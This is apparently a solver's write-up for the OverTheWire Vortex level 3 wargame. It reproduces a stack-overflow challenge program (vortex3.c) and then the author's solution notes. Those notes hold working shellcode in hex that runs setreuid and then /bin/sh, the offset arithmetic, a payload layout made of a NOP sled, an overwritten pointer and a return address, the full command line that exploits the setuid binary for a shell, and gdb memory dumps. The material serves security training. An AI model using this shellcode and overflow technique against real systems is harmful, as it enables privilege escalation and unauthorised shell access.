Challenge page is <a href="http://www.overthewire.org/wargames/vortex/vortex3.shtml">HERE</a>

<<CHALLENGE_CONTENT
Level 3

A Stack Overflow with a Difference
This level is pretty straight forward. Just sit down and understand what the code is doing. Your shellcode will require a setuid(LEVEL4_UID) since bash drops effective privileges. You could alternatively write a quick setuid(geteuid()) wrapper around bash.
NOTE: ctors/dtors might no longer be writable, although this level is compiled with -Wl,-z,norelro. Lookup some information about this e.g. here
NOTE: This level is solvable, but it is tricky. If all else fails, use an intelligent bruteforce and then circle back to find out why it worked.
Reading Material
Smashing the Stack for Fun and Profit
Bypassing StackGuard and StackShield

Code listing (vortex3.c)

	 1 /*
	 2  * 0xbadc0ded.org Challenge #02 (2003-07-08)
	 3  *
	 4  * Joel Eriksson <je@0xbadc0ded.org>
	 5  */
	 6 
	 7 
	 8 #include <string.h>
	 9 #include <stdlib.h>
	10 #include <stdio.h>
	11 
	12 unsigned long val = 31337;
	13 unsigned long *lp = &val;
	14 
	15 int main(int argc, char **argv)
	16 {
	17         unsigned long **lpp = &lp, *tmp;
	18         char buf[128];
	19 
	20         if (argc != 2)
	21                 exit(1);
	22 
	23         strcpy(buf, argv[1]);
	24 
	25         if (((unsigned long) lpp & 0xffff0000) != 0x08040000)
	26                 exit(2);
	27 
	28         tmp = *lpp;
	29         **lpp = (unsigned long) &buf;
	30         *lpp = tmp;
	31 
	32         exit(0);
	33 }

CHALLENGE_CONTENT

Comment by me:
	- try to read /etc/vortex_pass/vortex4
	- address is randomized
	- to overwrite 
		overwrite lpp: from 0x9c($esp) - 0x18($esp) = 132 + (4bytes to write)
		overwrite saved EIP: 136+12+(4bytes to write, which is new eip)
	- range to jump starts from $esp - $esp+0x9c+0x10 = 172 bytes
	- Shellcode with setreuid() from http://www.shell-storm.org/shellcode/files/shellcode-399.php (34bytes)
		"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
		"\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
		"\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
	- NOP is 0x90
	- Structure:
		NOP(98): "\x90" *98
		SHELL(34): "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
		LLP(4): 0x0804963c ---> "\x3c\x96\x04\x08"
		NOP(12): "\x90" * 12
		EIP(4): 0xffffd74c - 60 = 0xffffd710 --> "\x10\xd7\xff\xff"
	- run : 
		/vortex/vortex3 $(python -c 'print "\x90"*98+"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"+"\x3c\x96\x04\x08"+"\x90"*12+"\x10\xd7\xff\xff"')
	- DEBUGGING:

		0x8049638 <val>:	0x00007a69
		0x804963c <lp>:		0x08049638
		0xffffd748 ($ebp):	0xffffd7d8	
		0xffffd74c ($ebp+4)/($esp+4): 0xf7e89e37 <<< saved old EIP, back to shell
		0xffffd750 0x8(%ebp) <argc>:	0x00000002
		0xffffd764 0xc(%ebp) <argv>:	0xffffd7f4 
			0xffffd7f4 =>
				0xffffd91c <argv[0]>:	"/vortex/vortex3"
				0xffffd92c <argv[1]>:	"aaaaaaaa"
		0xffffd6a0: ($esp): 
		0xffffd6b8: 0x18($esp) <buf>: 0x61616161		<<< values
		0xffffd6bc:
		0xffffd738:	0x98($esp) <tmp>: 0x0804847b		<<< tmp
		0xffffd73c:	0x9c($esp) <lpp>: 0x0804963c		<<< llp
		0xffffd74c:	0xac($esp) <saved eip>

		0x08048410 <+60>:	call   0x80482f4 <strcpy@plt>
	


